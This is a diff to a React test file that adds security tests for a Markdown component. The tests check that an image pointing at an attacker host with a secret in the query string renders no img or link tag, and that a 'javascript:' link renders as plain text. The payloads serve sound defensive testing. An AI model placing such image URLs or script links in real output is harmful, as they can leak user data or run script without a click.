@@ -1,3 +1,4 @@
+import { renderToStaticMarkup } from "react-dom/server";
 import { render, screen } from "@testing-library/react";
 import { Markdown } from "@/components/Markdown";
 
@@ -33,5 +34,22 @@ describe("Markdown", () => {
     render(<Markdown>{"[docs](https://example.com)"}</Markdown>);
     const link = screen.getByRole("link", { name: "docs" });
     expect(link).toHaveAttribute("rel", expect.stringContaining("noopener"));
+  });
+
+  it("never renders images or preload links (no click-free exfiltration)", () => {
+    const md = "![alt text](https://attacker.example/p?d=SECRET)";
+    const html = renderToStaticMarkup(<Markdown>{md}</Markdown>);
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("<link");
+    expect(html).not.toContain("attacker.example");
+    const { container } = render(<Markdown>{md}</Markdown>);
+    expect(container.querySelector("img, link")).toBeNull();
+    expect(container.textContent).toContain("alt text");
+  });
+
+  it("renders a link with an empty sanitized href as plain text", () => {
+    render(<Markdown>{"[click](javascript:alert(1))"}</Markdown>);
+    expect(screen.queryByRole("link")).toBeNull();
+    expect(screen.getByText("click")).toBeInTheDocument();
   });
 });
